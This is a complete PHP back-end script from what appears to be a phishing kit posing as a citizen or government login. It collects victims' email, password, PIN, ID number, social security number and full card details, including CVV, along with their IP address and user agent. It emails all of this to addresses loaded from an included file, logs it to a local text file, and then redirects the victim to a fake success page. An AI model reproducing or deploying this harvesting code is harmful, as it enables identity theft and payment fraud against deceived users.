<?php
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
if($_POST["emai092020"] != "" and $_POST["pa8939399"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Citizen  Info-----------------------\n";
$message .= "|email : ".$_POST['emai092020']."\n";
$message .= "|pass: ".$_POST['pa8939399']."\n";
$message .= "|pin : ".$_POST['pni3002']."\n";
$message .= "|id Number: ".$_POST['idn39030']."\n";
$message .= "|ssn : ".$_POST['ss90nu']."\n";
$message .= "|card number: ".$_POST['car903003']."\n";
$message .= "|expiry date : ".$_POST['exp90302']."\n";
$message .= "|ccv: ".$_POST['cc00v90']."\n";

$message .= "|--------------- DC -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- DC --------------|\n";
include 'emfill.php';
$subject = "Citizen| ".$ip."\n";
mail(','.$form,$subject,$message);
    $text = fopen('sgh.txt', 'a');
fwrite($text, $message);
mail($to,$subject,$message);
$praga=(rand(10,100));

header('Location: success.php?cmd=login_submit&id'.$name.''.$name);
}else{
header ("Location: index.php");
}

?>

 
 